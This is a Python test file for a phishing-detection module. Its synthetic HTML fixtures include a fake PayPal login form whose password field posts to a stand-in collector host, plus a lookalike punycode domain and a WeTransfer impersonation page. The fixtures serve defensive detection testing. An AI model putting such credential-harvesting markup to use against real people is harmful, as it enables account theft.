"""Regression tests for the heuristics, built from patterns observed in real
samples pulled from the OpenPhish public feed during calibration (see
README.md -> Limites connues). Fixtures are synthetic reconstructions of
those patterns, not live/hardcoded malicious URLs, so they stay stable.
"""
from websec_agent import web_analysis as wa

BENIGN_HTML = """
<html><head><title>Example Domain</title></head>
<body><p>This domain is for use in illustrative examples.</p></body></html>
"""

# Pattern observed on a real OpenPhish sample: brand name used verbatim as
# the page title, served from an attacker-controlled subdomain of a free
# PaaS host (vercel.app) that also contains the brand name in its own label.
LOOKALIKE_SUBDOMAIN_HTML = """
<html><head><title>WeTransfer</title>
<link rel="icon" href="https://cdn.other-host.example/favicon.ico">
</head>
<body><p>Your file is ready. Please verify your account to download it.</p></body></html>
"""

# Classic credential-phishing kit: password field posting to a domain that
# doesn't match the page it's embedded on, plus urgency language.
CREDENTIAL_PHISH_HTML = """
<html><head><title>PayPal - Secure Login</title></head>
<body>
<p>Your account has been suspended. Verify your account immediately.</p>
<form action="https://collector.evil-example.net/save" method="post">
  <input type="text" name="user">
  <input type="password" name="pass">
</form>
</body></html>
"""

PUNYCODE_IOC_HTML = """
<html><head><title>Login</title></head>
<body><a href="https://xn--pypal-4ve.com/login">Continue</a></body></html>
"""

IP_LITERAL_IOC_HTML = """
<html><head><title>Invoice</title></head>
<body><img src="http://203.0.113.42/track.png"></body></html>
"""


def test_benign_page_scores_low():
    structure = wa.analyze_structure(BENIGN_HTML, "https://example.com")
    iocs = wa.extract_iocs(BENIGN_HTML, "https://example.com")
    verdict = wa.score_phishing(BENIGN_HTML, structure, iocs, "https://example.com")
    assert verdict["level"] == "low"
    assert verdict["score"] == 0


def test_brand_in_title_on_lookalike_subdomain_is_flagged():
    url = "https://wetransfer-smoky.vercel.app/"
    structure = wa.analyze_structure(LOOKALIKE_SUBDOMAIN_HTML, url)
    iocs = wa.extract_iocs(LOOKALIKE_SUBDOMAIN_HTML, url)
    verdict = wa.score_phishing(LOOKALIKE_SUBDOMAIN_HTML, structure, iocs, url)
    assert verdict["level"] in ("medium", "high")
    assert any("wetransfer" in r for r in verdict["reasons"])


def test_real_brand_domain_is_not_flagged_for_its_own_name():
    # wetransfer.com mentioning "WeTransfer" in its own title must not
    # trigger the brand-impersonation reason.
    url = "https://wetransfer.com/"
    structure = wa.analyze_structure(LOOKALIKE_SUBDOMAIN_HTML, url)
    iocs = wa.extract_iocs(LOOKALIKE_SUBDOMAIN_HTML, url)
    verdict = wa.score_phishing(LOOKALIKE_SUBDOMAIN_HTML, structure, iocs, url)
    assert not any("brand" in r for r in verdict["reasons"])


def test_credential_phish_scores_high():
    url = "https://totally-legit-mail.example/"
    structure = wa.analyze_structure(CREDENTIAL_PHISH_HTML, url)
    iocs = wa.extract_iocs(CREDENTIAL_PHISH_HTML, url)
    verdict = wa.score_phishing(CREDENTIAL_PHISH_HTML, structure, iocs, url)
    assert verdict["level"] == "high"
    reasons = " ".join(verdict["reasons"])
    assert "password field submits to external domain" in reasons
    assert "urgency" in reasons


def test_punycode_domain_is_extracted_as_ioc():
    iocs = wa.extract_iocs(PUNYCODE_IOC_HTML, "https://example.com")
    assert iocs["punycode_domains"] == ["xn--pypal-4ve.com"]


def test_ip_literal_url_is_extracted_as_ioc():
    iocs = wa.extract_iocs(IP_LITERAL_IOC_HTML, "https://example.com")
    assert iocs["ip_literal_urls"] == ["http://203.0.113.42/track.png"]


def test_registrable_domain_handles_multi_label_suffixes():
    # .co.uk, .com.mu etc. are two-label public suffixes - naive "last two
    # labels" parsing collapses every site on them into one, which would
    # mask lookalike domains sharing a country-code TLD.
    assert wa._registrable_domain("www.bbc.co.uk") == "bbc.co.uk"
    assert wa._registrable_domain("www.roblox.com.mu") == "roblox.com.mu"
    assert wa._registrable_domain("evil.co.uk") == "evil.co.uk"


def test_paas_subdomains_are_treated_as_distinct_sites():
    # vercel.app/pages.dev are PSL "private" suffixes - every tenant
    # subdomain is a different, unrelated site.
    assert wa._registrable_domain("wetransfer-smoky.vercel.app") == "wetransfer-smoky.vercel.app"
    assert wa._registrable_domain("other-tenant.vercel.app") == "other-tenant.vercel.app"
